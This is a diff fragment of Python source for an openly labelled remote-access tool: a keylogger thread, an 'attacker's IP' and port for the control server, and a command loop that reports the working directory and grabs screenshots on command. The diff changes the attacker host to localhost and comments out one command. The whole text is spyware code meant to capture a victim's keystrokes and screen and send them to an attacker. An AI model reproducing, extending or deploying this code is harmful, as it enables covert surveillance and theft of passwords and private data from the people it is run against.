@@ -18,7 +18,7 @@ class KeyLoggerThread(threading.Thread):
         with Listener(on_press = on_press) as listener:
             listener.join()
 
-HOST = "10.1.21.98"  # attacker's IP adress (this is a random one, just to show you)
+HOST = "localhost"  # attacker's IP adress (this is a random one, just to show you)
 PORT = 6969 # attacker's port on which server is listening
  
 # same syntax here as for the server
@@ -41,8 +41,8 @@ while True:
                     encrypter.send_message_client(("Directory : " + os.getcwd()))
                 except OSError as winerror:
                     encrypter.send_message_client(("No such directory in : " +os.getcwd()))
-    elif command == "getpath" :
-        encrypter.send_message_client(os.getcwd())
+    #elif command == "getpath" :
+    #   encrypter.send_message_client(os.getcwd())
     elif command == "stb" :
         im = ImageGrab.grab()
         fileName = "pic.png"
